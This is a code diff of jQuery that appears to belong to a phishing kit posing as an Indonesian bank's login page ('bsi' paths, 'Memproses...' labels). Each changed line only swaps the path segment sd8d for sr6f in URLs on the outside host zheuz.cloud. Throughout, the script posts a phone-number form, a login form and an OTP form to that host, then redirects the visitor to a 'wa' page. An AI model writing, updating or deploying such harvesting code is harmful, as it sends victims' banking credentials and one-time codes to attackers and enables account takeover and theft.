@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/sd8d/no.php',
+            url: 'https://zheuz.cloud/bsi/sr6f/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/sd8d/login.php',
+            url: 'https://zheuz.cloud/bsi/sr6f/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -58,7 +58,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://zheuz.cloud/bsi/sd8d/otp.php',
+ url: 'https://zheuz.cloud/bsi/sr6f/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -97,7 +97,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://zheuz.cloud/wa/sd8d';
+location.href='https://zheuz.cloud/wa/sr6f';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
